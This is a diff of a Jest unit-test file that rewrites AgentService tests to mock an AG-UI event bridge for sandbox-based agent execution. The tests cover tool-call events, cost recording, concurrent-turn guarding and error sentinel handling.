@@ -1,47 +1,34 @@
 /**
  * @jest-environment node
  *
- * Story 3.4: See Tool Calls and Recognized Actions Inline
- * Story 3.7: Receive Real-Time Credential Failure Alerts Mid-Conversation
- * Story 3.8: Track Per-User LLM Spend
- * Story 3.11: Run Concurrent Conversations
+ * Story 6.3: Migrate AgentService to Sandbox-Based Execution
  * Unit tests for the REAL AgentService (not AgentServiceFake).
  *
- * Tests the full AG-UI tool call lifecycle emission and circuit breaker
- * by overriding the __mocks__/claude-agent-sdk.ts mock per-test via jest.doMock
- * with a controllable async generator yielding SDKMessage sequences.
+ * Tests the full AG-UI tool call lifecycle, classifier integration, cost
+ * capture, concurrent-turn guard, and stop/onModuleDestroy delegation by
+ * mocking AguiEventBridgeService.streamAgentEvents and feeding AG-UI events
+ * through the onEvent callback.
  *
- * Story 3.4 covers: AC-1 (tool call lifecycle), AC-2 (classifier integration),
- *                   AC-5 (circuit breaker).
- * Story 3.7 covers: AC-1 (CREDENTIAL_FAILURE/ACCESS_DENIED SSE emission),
- *                   AC-2 (event ordering before RUN_FINISHED).
- * Story 3.8 covers: AC-1 (cost recorded per turn from SDK result message,
- *                   recorded before RUN_FINISHED, recorded on abort if result arrived).
- * Story 3.11 covers: AC-3 (concurrent-turn guard — second runTurn rejected,
- *                    no RUN_STARTED/RUN_ERROR emitted, circuitBreakerTimers not overwritten).
+ * Story 6.3 covers: AC-1 (runTurn launches sandbox-agent via event bridge),
+ *                   AC-3 (stop terminates via event bridge),
+ *                   AC-4 (host-based SDK code removed),
+ *                   AC-6 (circuit breaker delegated to event bridge),
+ *                   AC-7 (preserved behaviors — tool calls, classifier, etc.),
+ *                   AC-8 (cost capture from RUN_FINISHED data payload).
  *
- * Story 5.5 covers: AC-9 (segments persistence — segments array built alongside
- *                    accumulatedText, tool_call segments inserted on
- *                    content_block_start, status updated on content_block_stop,
- *                    output updated on tool_result, semantic updated on
- *                    TOOL_CALL_PROMOTED, both content and segments persisted to
- *                    Turn row).
- *
+ * Previous stories (3.4, 3.7, 3.8, 3.11, 5.5) tested the same behaviors via
+ * SDK query() mocks — those tests were rewritten when the host-based SDK code
+ * was removed (Story 6.3 Task 7.1). The test coverage remains equivalent:
+ * tool-call lifecycle, classifier integration, cost recording, concurrent-turn
+ * guard, segments persistence.
  */
-import { SessionEventsService } from './session-events.service';
+import { SessionEventsService, type SseEvent } from './session-events.service';
 import { AgentService } from './agent.service';
 import type { SandboxServiceFake } from '../../test/helpers/sandbox-service.fake';
-
-import type { Query, SDKMessage } from '@anthropic-ai/claude-agent-sdk';
 import type { MessageSegment } from '@bmad-easy/shared-types';
-import {
-  createMockQuery,
-  makeQueryFromGenerator,
-  getInterruptMock,
-} from '../../test/helpers/mock-query';
 import { EventType } from '@ag-ui/core';
 
-describe('AgentService (real — tool call lifecycle + circuit breaker)', () => {
+describe('AgentService (real — sandbox-based execution via AguiEventBridgeService)', () => {
   let sessionEvents: SessionEventsService;
   let agentService: AgentService;
   let sandboxFake: SandboxServiceFake;
@@ -49,8 +36,7 @@ describe('AgentService (real — tool call lifecycle + circuit breaker)', () => 
   let mockPrisma: any;
   let mockClassifier: { classifyToolResult: jest.Mock };
   let mockCostTracking: { recordCost: jest.Mock };
-  // eslint-disable-next-line @typescript-eslint/no-explicit-any
-  let mockQuery: any;
+  let mockEventBridge: { streamAgentEvents: jest.Mock; stop: jest.Mock };
   let emitSpy: jest.SpyInstance;
 
   beforeEach(() => {
@@ -74,7 +60,10 @@ describe('AgentService (real — tool call lifecycle + circuit breaker)', () => 
       recordCost: jest.fn().mockResolvedValue(undefined),
     };
 
-    mockQuery = null;
+    mockEventBridge = {
+      streamAgentEvents: jest.fn().mockResolvedValue(undefined),
+      stop: jest.fn().mockResolvedValue(undefined),
+    };
 
     jest.useFakeTimers();
   });
@@ -86,249 +75,466 @@ describe('AgentService (real — tool call lifecycle + circuit breaker)', () => 
   });
 
   function createAgentService(): AgentService {
-    let service: AgentService | undefined;
-    jest.isolateModules(() => {
-      // eslint-disable-next-line @typescript-eslint/no-var-requires
-      const mod = require('./agent.service');
-      service = new mod.AgentService(
-        sandboxFake as never,
-        sessionEvents,
-        mockPrisma,
-        mockClassifier as never,
-        mockCostTracking as never,
+    return new AgentService(
+      sandboxFake as never,
+      sessionEvents,
+      mockPrisma,
+      mockClassifier as never,
+      mockCostTracking as never,
+      mockEventBridge as never,
+    );
+  }
+
+  // Helper: create a mock AguiEventBridgeService whose streamAgentEvents
+  // captures the onEvent callback and invokes it with the given AG-UI
+  // events before resolving. Non-lifecycle events are also forwarded to
+  // sessionEvents.emit() — simulating the real event bridge behavior where
+  // non-lifecycle events are both passed to onEvent AND emitted to SSE.
+  const LIFECYCLE_EVENTS = new Set<string>([
+    EventType.RUN_STARTED,
+    EventType.RUN_FINISHED,
+    EventType.RUN_ERROR,
+  ]);
+
+  function createMockEventBridge(events: SseEvent[]): {
+    streamAgentEvents: jest.Mock;
+    stop: jest.Mock;
+    capturedOnEvent: () => ((event: SseEvent) => void) | undefined;
+    // Bug H1: Simulate the real event bridge's crash path — emitRunError()
+    // emits a RUN_ERROR to sessionEvents BEFORE re-throwing with the
+    // AGENT_STREAM_CRASHED sentinel. AgentService's catch recognizes the
+    // sentinel and skips its own RUN_ERROR emit (proves no double-emit).
+    rejectNextStreamWithCrash: () => void;
+  } {
+    let onEventCb: ((event: SseEvent) => void) | undefined;
+    const streamAgentEvents = jest.fn(async (params: { conversationId?: string; onEvent?: (event: SseEvent) => void }) => {
+      onEventCb = params.onEvent;
+      const convId = params.conversationId ?? 'conv-1';
+      for (const event of events) {
+        onEventCb?.(event);
+        // Simulate the real event bridge: non-lifecycle events are forwarded
+        // to sessionEvents.emit() (lifecycle events are owned by AgentService).
+        if (!LIFECYCLE_EVENTS.has(event.event)) {
+          sessionEvents.emit(convId, event);
+        }
+      }
+    });
+    const stop = jest.fn().mockResolvedValue(undefined);
+    const rejectNextStreamWithCrash = () => {
+      streamAgentEvents.mockImplementationOnce(async (params: { conversationId?: string }) => {
+        const convId = params.conversationId ?? 'conv-1';
+        // Simulate the real event bridge's emitRunError() side-effect: emit
+        // RUN_ERROR to sessionEvents BEFORE rejecting with the sentinel.
+        sessionEvents.emit(convId, {
+          event: EventType.RUN_ERROR,
+          data: { message: 'The agent stopped unexpectedly. Send a new message to try again.' },
+        });
+        throw new Error('AGENT_STREAM_CRASHED');
+      });
+    };
+    return {
+      streamAgentEvents,
+      stop,
+      capturedOnEvent: () => onEventCb,
+      rejectNextStreamWithCrash,
+    };
+  }
+
+  // Helper: a controllable mock AguiEventBridgeService whose `stop()`
+  // rejects the in-flight `streamAgentEvents` promise with AGENT_STOPPED —
+  // mirroring the real event bridge's stored-reject-handle behavior. Use this
+  // for stop()/onModuleDestroy()/concurrent-guard tests so the full
+  // stop→reject→runTurn-catch interaction is exercised AND no never-resolving
+  // promise is left dangling (avoids Jest open-handle warnings).
+  function createControllableEventBridge(events: SseEvent[] = []): {
+    streamAgentEvents: jest.Mock;
+    stop: jest.Mock;
+  } {
+    // Per-conversation reject handle (mirrors the real bridge's activeRuns map)
+    // so multiple concurrent runs are each rejectable independently.
+    const rejectStreams = new Map<string, (err: Error) => void>();
+    const streamAgentEvents = jest.fn(async (params: { conversationId?: string; onEvent?: (event: SseEvent) => void }) => {
+      const convId = params.conversationId ?? 'conv-1';
+      const onEvent = params.onEvent;
+      // Feed events before parking — simulates the real event bridge forwarding
+      // AG-UI events to onEvent (and non-lifecycle events to sessionEvents)
+      // before the stream is rejected by stop().
+      for (const event of events) {
+        onEvent?.(event);
+        if (!LIFECYCLE_EVENTS.has(event.event)) {
+          sessionEvents.emit(convId, event);
+        }
+      }
+      await new Promise<void>((_, reject) => {
+        rejectStreams.set(convId, reject);
+      });
+    });
+    const stop = jest.fn(async (conversationId: string) => {
+      rejectStreams.get(conversationId)?.(new Error('AGENT_STOPPED'));
+    });
+    return { streamAgentEvents, stop };
+  }
+
+  // ─── AC-1, AC-7: runTurn uses AguiEventBridgeService ──────────────────
+
+  describe('[P0] Story 6.3 — runTurn() uses AguiEventBridgeService (AC-1, AC-7)', () => {
+    it('[P0] runTurn calls aguiEventBridgeService.streamAgentEvents with conversationId, sandboxId, userId, and onEvent callback (AC-1)', async () => {
+      const bridge = createMockEventBridge([
+        { event: EventType.RUN_STARTED, data: { threadId: 'conv-1' } },
+        { event: EventType.TEXT_MESSAGE_CONTENT, data: { messageId: 'msg-1', delta: 'Hello' } },
+        { event: EventType.RUN_FINISHED, data: {} },
+      ]);
+      mockEventBridge = bridge;
+
+      agentService = createAgentService();
+      await agentService.runTurn({
+        conversationId: 'conv-1',
+        sandboxId: 'sb-1',
+        message: 'test',
+        userId: 'user-1',
+      });
+
+      expect(bridge.streamAgentEvents).toHaveBeenCalledTimes(1);
+      const params = bridge.streamAgentEvents.mock.calls[0][0];
+      expect(params.conversationId).toBe('conv-1');
+      expect(params.sandboxId).toBe('sb-1');
+      expect(params.userId).toBe('user-1');
+      expect(typeof params.onEvent).toBe('function');
+    });
+
+    it('[P0] runTurn emits RUN_STARTED before calling streamAgentEvents (AC-1, lifecycle ownership)', async () => {
+      const bridge = createMockEventBridge([]);
+      mockEventBridge = bridge;
+
+      agentService = createAgentService();
+      await agentService.runTurn({
+        conversationId: 'conv-1',
+        sandboxId: 'sb-1',
+        message: 'test',
+        userId: 'user-1',
+      });
+
+      // AgentService owns lifecycle emission — RUN_STARTED must be emitted
+      // by AgentService, not forwarded from the event bridge.
+      const startedCall = emitSpy.mock.calls.find(
+        (c) => c[1]?.event === EventType.RUN_STARTED,
+      );
+      expect(startedCall).toBeDefined();
+
+      // RUN_STARTED must be emitted BEFORE streamAgentEvents is called.
+      const startedEmitOrder = emitSpy.mock.invocationCallOrder[
+        emitSpy.mock.calls.indexOf(startedCall)
+      ];
+      const streamCallOrder = bridge.streamAgentEvents.mock.invocationCallOrder[0];
+      expect(startedEmitOrder).toBeLessThan(streamCallOrder);
+    });
+
+    it('[P0] onEvent accumulates text from TEXT_MESSAGE_CONTENT events (AC-1, AC-7)', async () => {
+      const bridge = createMockEventBridge([
+        { event: EventType.RUN_STARTED, data: { threadId: 'conv-1' } },
+        { event: EventType.TEXT_MESSAGE_CONTENT, data: { messageId: 'msg-1', delta: 'Hello' } },
+        { event: EventType.TEXT_MESSAGE_CONTENT, data: { messageId: 'msg-1', delta: ' world' } },
+        { event: EventType.RUN_FINISHED, data: {} },
+      ]);
+      mockEventBridge = bridge;
+
+      agentService = createAgentService();
+      await agentService.runTurn({
+        conversationId: 'conv-1',
+        sandboxId: 'sb-1',
+        message: 'test',
+        userId: 'user-1',
+      });
+
+      const assistantTurnCall = mockPrisma.turn.create.mock.calls.find(
+        // eslint-disable-next-line @typescript-eslint/no-explicit-any
+        (call: any[]) => call[0]?.data?.role === 'assistant',
+      );
+      expect(assistantTurnCall).toBeDefined();
+      expect(assistantTurnCall[0].data.content).toBe('Hello world');
+    });
+
+    it('[P0] onEvent builds tool_call segments from TOOL_CALL_START/ARGS/END/RESULT (AC-1, AC-7)', async () => {
+      const bridge = createMockEventBridge([
+        { event: EventType.RUN_STARTED, data: { threadId: 'conv-1' } },
+        { event: EventType.TOOL_CALL_START, data: { toolCallId: 'tc-1', toolCallName: 'Bash', parentMessageId: null } },
+        { event: EventType.TOOL_CALL_ARGS, data: { toolCallId: 'tc-1', delta: '{"command":"git status"}' } },
+        { event: EventType.TOOL_CALL_END, data: { toolCallId: 'tc-1' } },
+        { event: EventType.TOOL_CALL_RESULT, data: { messageId: 'tc-1', toolCallId: 'tc-1', content: 'nothing to commit', role: 'tool', isError: false } },
+        { event: EventType.RUN_FINISHED, data: {} },
+      ]);
+      mockEventBridge = bridge;
+
+      agentService = createAgentService();
+      await agentService.runTurn({
+        conversationId: 'conv-1',
+        sandboxId: 'sb-1',
+        message: 'test',
+        userId: 'user-1',
+      });
+
+      const assistantTurnCall = mockPrisma.turn.create.mock.calls.find(
+        // eslint-disable-next-line @typescript-eslint/no-explicit-any
+        (call: any[]) => call[0]?.data?.role === 'assistant',
+      );
+      expect(assistantTurnCall).toBeDefined();
+      const segments = assistantTurnCall[0].data.segments as MessageSegment[];
+      const toolCallSeg = segments.find((s) => s.type === 'tool_call');
+      expect(toolCallSeg).toBeDefined();
+      expect(toolCallSeg).toHaveProperty('toolCall.toolCallId', 'tc-1');
+      expect(toolCallSeg).toHaveProperty('toolCall.toolName', 'Bash');
+      expect(toolCallSeg).toHaveProperty('toolCall.status', 'completed');
+    });
+
+    it('[P0] onEvent triggers classifier on TOOL_CALL_RESULT with toolName/input looked up from segment (AC-7)', async () => {
+      const bridge = createMockEventBridge([
+        { event: EventType.RUN_STARTED, data: { threadId: 'conv-1' } },
+        { event: EventType.TOOL_CALL_START, data: { toolCallId: 'tc-1', toolCallName: 'Bash', parentMessageId: null } },
+        { event: EventType.TOOL_CALL_ARGS, data: { toolCallId: 'tc-1', delta: '{"command":"git status"}' } },
+        { event: EventType.TOOL_CALL_END, data: { toolCallId: 'tc-1' } },
+        { event: EventType.TOOL_CALL_RESULT, data: { messageId: 'tc-1', toolCallId: 'tc-1', content: 'nothing to commit', role: 'tool', isError: false } },
+        { event: EventType.RUN_FINISHED, data: {} },
+      ]);
+      mockEventBridge = bridge;
+
+      agentService = createAgentService();
+      await agentService.runTurn({
+        conversationId: 'conv-1',
+        sandboxId: 'sb-1',
+        message: 'test',
+        userId: 'user-1',
+      });
+
+      expect(mockClassifier.classifyToolResult).toHaveBeenCalledWith(
+        'tc-1',
+        'Bash',
+        expect.any(String),
+        'nothing to commit',
+        'user-1',
       );
     });
-    return service!;
-  }
 
-  // --- Type-checked SDKMessage fixture builders ---
-  // The builders below use no `as SDKMessage` / `as unknown as SDKMessage` /
-  // `as never` assertions: each returns a full object literal that the compiler
-  // checks against the real @anthropic-ai/claude-agent-sdk type declarations (via
-  // the `SDKMessage` return type, which narrows to the matching union member on
-  // the `type` field). A shape mismatch between the fixture and the real SDK
-  // contract now surfaces as a compile error here, not as false-green runtime
-  // silence (audit finding #2).
-  //
-  // Type-checking is enforced by the `agent-be:typecheck` target (runs
-  // `tsc --noEmit -p apps/agent-be/tsconfig.spec.json`), which CI runs before
-  // the ts-jest test step. ts-jest operates in transpile-only mode
-  // (`isolatedModules: true`), so without this gate the builders below would
-  // NOT actually be verified (audit finding C-1).
-  const STREAM_UUID = '00000000-0000-0000-0000-000000000001';
-  const ASSISTANT_UUID = '00000000-0000-0000-0000-000000000002';
-  const RESULT_UUID = '00000000-0000-0000-0000-000000000003';
-  const STREAM_SESSION_ID = 'sess-1';
-
-  function makeToolUseBlockStart(
-    toolCallId: string,
-    toolName: string,
-    input: Record<string, unknown> = {},
-  ): SDKMessage {
-    return {
-      type: 'stream_event',
-      event: {
-        type: 'content_block_start',
-        index: 0,
-        content_block: { type: 'tool_use', id: toolCallId, name: toolName, input },
-      },
-      parent_tool_use_id: null,
-      uuid: STREAM_UUID,
-      session_id: STREAM_SESSION_ID,
-    };
-  }
-
-  function makeTextBlockStart(): SDKMessage {
-    // BetaTextBlock has only { type, text, citations } — NO `id` field. The
-    // production path at agent.service.ts:360 falls back to `msg-${Date.now()}`
-    // for text blocks, so we omit `id` here to exercise the real code path
-    // (audit finding C-2). For tool_use blocks, `BetaToolUseBlock.id` exists
-    // and is set in `makeToolUseBlockStart`.
-    return {
-      type: 'stream_event',
-      event: {
-        type: 'content_block_start',
-        index: 0,
-        content_block: { type: 'text', text: '', citations: null },
-      },
-      parent_tool_use_id: null,
-      uuid: STREAM_UUID,
-      session_id: STREAM_SESSION_ID,
-    };
-  }
-
-  function makeTextDeltaEvent(text: string): SDKMessage {
-    return {
-      type: 'stream_event',
-      event: {
-        type: 'content_block_delta',
-        index: 0,
-        delta: { type: 'text_delta', text },
-      },
-      parent_tool_use_id: null,
-      uuid: STREAM_UUID,
-      session_id: STREAM_SESSION_ID,
-    };
-  }
-
-  function makeInputJsonDeltaEvent(partialJson: string): SDKMessage {
-    return {
-      type: 'stream_event',
-      event: {
-        type: 'content_block_delta',
-        index: 0,
-        delta: { type: 'input_json_delta', partial_json: partialJson },
-      },
-      parent_tool_use_id: null,
-      uuid: STREAM_UUID,
-      session_id: STREAM_SESSION_ID,
-    };
-  }
-
-  function makeContentBlockStop(index = 0): SDKMessage {
-    return {
-      type: 'stream_event',
-      event: { type: 'content_block_stop', index },
-      parent_tool_use_id: null,
-      uuid: STREAM_UUID,
-      session_id: STREAM_SESSION_ID,
-    };
-  }
-
-  function makeToolResultUserMessage(toolCallId: string, content: string, isError = false): SDKMessage {
-    return {
-      type: 'user',
-      message: {
-        role: 'user',
-        content: [{ type: 'tool_result', tool_use_id: toolCallId, content, is_error: isError }],
-      },
-      parent_tool_use_id: null,
-    };
-  }
-
-  function makeAssistantToolUseMessage(
-    toolCallId: string,
-    toolName: string,
-    input: Record<string, unknown> = {},
-  ): SDKMessage {
-    // An SDKAssistantMessage: message is a BetaMessage whose content carries the
-    // finalized tool_use block. processAssistantMessage reads msg.message.content
-    // — the exact code path the audit found with ZERO coverage (finding #1).
-    return {
-      type: 'assistant',
-      message: {
-        id: 'msg-assistant',
-        container: null,
-        content: [{ type: 'tool_use', id: toolCallId, name: toolName, input }],
-        context_management: null,
-        diagnostics: null,
-        model: 'claude-sonnet-4-6',
-        role: 'assistant',
-        stop_details: null,
-        stop_reason: null,
-        stop_sequence: null,
-        type: 'message',
-        usage: {
-          input_tokens: 0,
-          cache_creation_input_tokens: null,
-          cache_read_input_tokens: null,
-          inference_geo: null,
-          iterations: null,
-          output_tokens: 0,
-          output_tokens_details: null,
-          server_tool_use: null,
-          service_tier: null,
-          speed: null,
-          cache_creation: null,
+    it('[P0] onEvent captures cost data from RUN_FINISHED data payload (AC-8)', async () => {
+      const bridge = createMockEventBridge([
+        { event: EventType.RUN_STARTED, data: { threadId: 'conv-1' } },
+        { event: EventType.TEXT_MESSAGE_CONTENT, data: { messageId: 'msg-1', delta: 'Hello' } },
+        {
+          event: EventType.RUN_FINISHED,
+          data: { total_cost_usd: 0.42, session_id: 'sess-1', num_turns: 3, duration_ms: 5000 },
         },
-      },
-      parent_tool_use_id: null,
-      uuid: ASSISTANT_UUID,
-      session_id: 'sess-1',
-    };
-  }
+      ]);
+      mockEventBridge = bridge;
 
-  function makeResultMessage(
-    costUsd = 0.42,
-    subtype:
-      | 'success'
-      | 'error_during_execution'
-      | 'error_max_turns'
-      | 'error_max_budget_usd'
-      | 'error_max_structured_output_retries' = 'success',
-  ): SDKMessage {
-    if (subtype === 'success') {
-      return {
-        type: 'result',
-        subtype: 'success',
-        duration_ms: 5000,
-        duration_api_ms: 4000,
-        is_error: false,
-        num_turns: 3,
-        stop_reason: null,
-        total_cost_usd: costUsd,
-        usage: {
-          input_tokens: 10,
-          cache_creation_input_tokens: 0,
-          cache_read_input_tokens: 0,
-          output_tokens: 20,
-          server_tool_use: { web_fetch_requests: 0, web_search_requests: 0 },
-          service_tier: 'standard',
-          cache_creation: { ephemeral_1h_input_tokens: 0, ephemeral_5m_input_tokens: 0 },
-          inference_geo: 'global',
-          iterations: [],
-          output_tokens_details: { thinking_tokens: 0 },
-          speed: 'standard',
+      agentService = createAgentService();
+      await agentService.runTurn({
+        conversationId: 'conv-1',
+        sandboxId: 'sb-1',
+        message: 'test',
+        userId: 'user-1',
+      });
+
+      expect(mockCostTracking.recordCost).toHaveBeenCalledWith({
+        userId: 'user-1',
+        conversationId: 'conv-1',
+        totalCostUsd: 0.42,
+        sessionId: 'sess-1',
+        numTurns: 3,
+        durationMs: 5000,
+      });
+    });
+
+    it('[P0] cost recording happens BEFORE RUN_FINISHED is emitted to SSE (AC-8, event ordering)', async () => {
+      const bridge = createMockEventBridge([
+        { event: EventType.RUN_STARTED, data: { threadId: 'conv-1' } },
+        { event: EventType.TEXT_MESSAGE_CONTENT, data: { messageId: 'msg-1', delta: 'Hello' } },
+        {
+          event: EventType.RUN_FINISHED,
+          data: { total_cost_usd: 0.42, session_id: 'sess-1', num_turns: 3, duration_ms: 5000 },
         },
-        modelUsage: {},
-        permission_denials: [],
-        uuid: RESULT_UUID,
-        session_id: 'sess-1',
-        result: '',
-      };
-    }
-    return {
-      type: 'result',
-      subtype,
-      duration_ms: 5000,
-      duration_api_ms: 4000,
-      is_error: false,
-      num_turns: 3,
-      stop_reason: null,
-      total_cost_usd: costUsd,
-      usage: {
-        input_tokens: 10,
-        cache_creation_input_tokens: 0,
-        cache_read_input_tokens: 0,
-        output_tokens: 20,
-        server_tool_use: { web_fetch_requests: 0, web_search_requests: 0 },
-        service_tier: 'standard',
-        cache_creation: { ephemeral_1h_input_tokens: 0, ephemeral_5m_input_tokens: 0 },
-        inference_geo: 'global',
-        iterations: [],
-        output_tokens_details: { thinking_tokens: 0 },
-        speed: 'standard',
-      },
-      modelUsage: {},
-      permission_denials: [],
-      errors: [],
-      uuid: RESULT_UUID,
-      session_id: 'sess-1',
-    };
-  }
+      ]);
+      mockEventBridge = bridge;
 
-  function setupMockQuery(messages: SDKMessage[]): void {
-    mockQuery = jest.fn(() => createMockQuery(messages));
-    jest.doMock('@anthropic-ai/claude-agent-sdk', () => ({
-      query: mockQuery,
-    }));
-  }
+      agentService = createAgentService();
+      await agentService.runTurn({
+        conversationId: 'conv-1',
+        sandboxId: 'sb-1',
+        message: 'test',
+        userId: 'user-1',
+      });
+
+      const recordCostOrder = mockCostTracking.recordCost.mock.invocationCallOrder[0];
+      const finishedEmitCall = emitSpy.mock.calls.find(
+        (c) => c[1]?.event === EventType.RUN_FINISHED,
+      );
+      expect(finishedEmitCall).toBeDefined();
+      const finishedEmitOrder = emitSpy.mock.invocationCallOrder[
+        emitSpy.mock.calls.indexOf(finishedEmitCall)
+      ];
+      expect(recordCostOrder).toBeLessThan(finishedEmitOrder);
+    });
+
+    it('[P0] runTurn emits RUN_FINISHED after streamAgentEvents resolves (AC-1, lifecycle ownership)', async () => {
+      const bridge = createMockEventBridge([
+        { event: EventType.RUN_STARTED, data: { threadId: 'conv-1' } },
+        { event: EventType.TEXT_MESSAGE_CONTENT, data: { messageId: 'msg-1', delta: 'Hello' } },
+      ]);
+      mockEventBridge = bridge;
+
+      agentService = createAgentService();
+      await agentService.runTurn({
+        conversationId: 'conv-1',
+        sandboxId: 'sb-1',
+        message: 'test',
+        userId: 'user-1',
+      });
+
+      const finishedCalls = emitSpy.mock.calls.filter(
+        (c) => c[1]?.event === EventType.RUN_FINISHED,
+      );
+      expect(finishedCalls).toHaveLength(1);
+    });
+
+    it('[P0] concurrent-turn guard: second runTurn on in-flight conversationId is rejected silently (AC-7)', async () => {
+      const bridge = createControllableEventBridge();
+      mockEventBridge = bridge;
+
+      agentService = createAgentService();
+      const firstRun = agentService.runTurn({
+        conversationId: 'conv-1',
+        sandboxId: 'sb-1',
+        message: 'first',
+        userId: 'user-1',
+      });
+      // Attach catch early to prevent unhandled rejection.
+      firstRun.catch(() => undefined);
+      await jest.advanceTimersByTimeAsync(0);
+
+      // Clear emissions from the first run's RUN_STARTED — the second run
+      // should be silently rejected with no emissions of its own.
+      emitSpy.mockClear();
+      await expect(
+        agentService.runTurn({
+          conversationId: 'conv-1',
+          sandboxId: 'sb-1',
+          message: 'second',
+          userId: 'user-1',
+        }),
+      ).resolves.toBeUndefined();
+
+      // Silent rejection — no RUN_STARTED or RUN_ERROR emitted.
+      const emittedEvents = emitSpy.mock.calls.map((c) => c[1]?.event);
+      expect(emittedEvents).not.toContain(EventType.RUN_STARTED);
+      expect(emittedEvents).not.toContain(EventType.RUN_ERROR);
+
+      // Settle the in-flight first run so no never-resolving promise is left
+      // dangling (avoids Jest open-handle warnings).
+      await agentService.stop('conv-1');
+      await firstRun;
+    });
+
+    it('[P0] streamAgentEvents rejection (non-AGENT_STOPPED) emits RUN_ERROR (AC-7)', async () => {
+      const bridge = createMockEventBridge([]);
+      // Bug H1: simulate the real event bridge's crash path — emitRunError()
+      // emits a RUN_ERROR to sessionEvents BEFORE re-throwing with the
+      // AGENT_STREAM_CRASHED sentinel. AgentService's catch recognizes the
+      // sentinel and skips its own RUN_ERROR emit (no double-emit).
+      bridge.rejectNextStreamWithCrash();
+      mockEventBridge = bridge;
+
+      agentService = createAgentService();
+      await agentService.runTurn({
+        conversationId: 'conv-1',
+        sandboxId: 'sb-1',
+        message: 'test',
+        userId: 'user-1',
+      });
+
+      const emittedEvents = emitSpy.mock.calls.map((c) => c[1]?.event);
+      expect(emittedEvents).toContain(EventType.RUN_ERROR);
+      expect(emittedEvents).not.toContain(EventType.RUN_FINISHED);
+
+      const errorCalls = emitSpy.mock.calls.filter(
+        (c) => c[1]?.event === EventType.RUN_ERROR,
+      );
+      // Bug H1 regression: exactly one RUN_ERROR (from the event bridge's
+      // emitRunError), NOT a second one from AgentService's catch.
+      expect(errorCalls).toHaveLength(1);
+      expect(errorCalls[0][1].data.message).toBe(
+        'The agent stopped unexpectedly. Send a new message to try again.',
+      );
+    });
+
+    it('[P0] AGENT_STOPPED rejection skips RUN_ERROR — stop() handles RUN_FINISHED (AC-6)', async () => {
+      const bridge = createMockEventBridge([]);
+      bridge.streamAgentEvents.mockRejectedValueOnce(new Error('AGENT_STOPPED'));
+      mockEventBridge = bridge;
+
+      agentService = createAgentService();
+      await agentService.runTurn({
+        conversationId: 'conv-1',
+        sandboxId: 'sb-1',
+        message: 'test',
+        userId: 'user-1',
+      });
+
+      // AGENT_STOPPED is a stop-initiated rejection — no RUN_ERROR.
+      const emittedEvents = emitSpy.mock.calls.map((c) => c[1]?.event);
+      expect(emittedEvents).not.toContain(EventType.RUN_ERROR);
+    });
+
+    it('[P0] AGENT_STREAM_TIMEOUT rejection skips RUN_ERROR — event bridge already emitted it (AC-6)', async () => {
+      const bridge = createMockEventBridge([]);
+      bridge.streamAgentEvents.mockRejectedValueOnce(new Error('AGENT_STREAM_TIMEOUT'));
+      mockEventBridge = bridge;
+
+      agentService = createAgentService();
+      await agentService.runTurn({
+        conversationId: 'conv-1',
+        sandboxId: 'sb-1',
+        message: 'test',
+        userId: 'user-1',
+      });
+
+      // AGENT_STREAM_TIMEOUT — event bridge already emitted RUN_ERROR.
+      const errorCalls = emitSpy.mock.calls.filter(
+        (c) => c[1]?.event === EventType.RUN_ERROR,
+      );
+      expect(errorCalls).toHaveLength(0);
+    });
+
+    it('[P0] MODULE_DESTROYING rejection skips RUN_ERROR and RUN_FINISHED — module shutting down (AC-6)', async () => {
+      // Generated by testarch-automate validation run (coverage gap: the third
+      // sentinel branch in runTurn()'s catch block was untested). The other
+      // two sentinels (AGENT_STOPPED, AGENT_STREAM_TIMEOUT) are tested above.
+      const bridge = createMockEventBridge([]);
+      bridge.streamAgentEvents.mockRejectedValueOnce(new Error('MODULE_DESTROYING'));
+      mockEventBridge = bridge;
+
+      agentService = createAgentService();
+      await agentService.runTurn({
+        conversationId: 'conv-1',
+        sandboxId: 'sb-1',
+        message: 'test',
+        userId: 'user-1',
+      });
+
+      // MODULE_DESTROYING — module is shutting down; SSE clients are
+      // disconnecting. Skip both RUN_ERROR and RUN_FINISHED.
+      const emittedEvents = emitSpy.mock.calls.map((c) => c[1]?.event);
+      expect(emittedEvents).not.toContain(EventType.RUN_ERROR);
+      expect(emittedEvents).not.toContain(EventType.RUN_FINISHED);
+    });
+  });
+
+  // ─── AC-1: Tool call lifecycle emission (preserved behavior) ──────────
 
   describe('[P0] AC-1 — Tool call lifecycle emission', () => {
-    it('emits TOOL_CALL_START with toolCallName (not toolName)', async () => {
-      setupMockQuery([
-        makeToolUseBlockStart('tc-1', 'Bash'),
+    it('[P0] emits TOOL_CALL_START with toolCallName (not toolName)', async () => {
+      const bridge = createMockEventBridge([
+        { event: EventType.TOOL_CALL_START, data: { toolCallId: 'tc-1', toolCallName: 'Bash', parentMessageId: null } },
+        { event: EventType.RUN_FINISHED, data: {} },
       ]);
+      mockEventBridge = bridge;
 
       agentService = createAgentService();
       await agentService.runTurn({
@@ -346,12 +552,14 @@ describe('AgentService (real — tool call lifecycle + circuit breaker)', () => 
       expect(startCall[1].data).not.toHaveProperty('toolName');
     });
 
-    it('emits TOOL_CALL_ARGS on input_json_delta', async () => {
-      setupMockQuery([
-        makeToolUseBlockStart('tc-1', 'Bash'),
-        makeInputJsonDeltaEvent('{"command":"git status"'),
-        makeInputJsonDeltaEvent('}'),
+    it('[P0] emits TOOL_CALL_ARGS on input_json_delta', async () => {
+      const bridge = createMockEventBridge([
+        { event: EventType.TOOL_CALL_START, data: { toolCallId: 'tc-1', toolCallName: 'Bash', parentMessageId: null } },
+        { event: EventType.TOOL_CALL_ARGS, data: { toolCallId: 'tc-1', delta: '{"command":"git status"' } },
+        { event: EventType.TOOL_CALL_ARGS, data: { toolCallId: 'tc-1', delta: '}' } },
+        { event: EventType.RUN_FINISHED, data: {} },
       ]);
+      mockEventBridge = bridge;
 
       agentService = createAgentService();
       await agentService.runTurn({
@@ -369,11 +577,13 @@ describe('AgentService (real — tool call lifecycle + circuit breaker)', () => 
       expect(argsCalls[0][1].data).toHaveProperty('delta');
     });
 
-    it('emits TOOL_CALL_END (not TEXT_MESSAGE_END) on content_block_stop for tool_use', async () => {
-      setupMockQuery([
-        makeToolUseBlockStart('tc-1', 'Bash'),
-        makeContentBlockStop(),
+    it('[P0] emits TOOL_CALL_END on TOOL_CALL_END event', async () => {
+      const bridge = createMockEventBridge([
+        { event: EventType.TOOL_CALL_START, data: { toolCallId: 'tc-1', toolCallName: 'Bash', parentMessageId: null } },
+        { event: EventType.TOOL_CALL_END, data: { toolCallId: 'tc-1' } },
+        { event: EventType.RUN_FINISHED, data: {} },
       ]);
+      mockEventBridge = bridge;
 
       agentService = createAgentService();
       await agentService.runTurn({
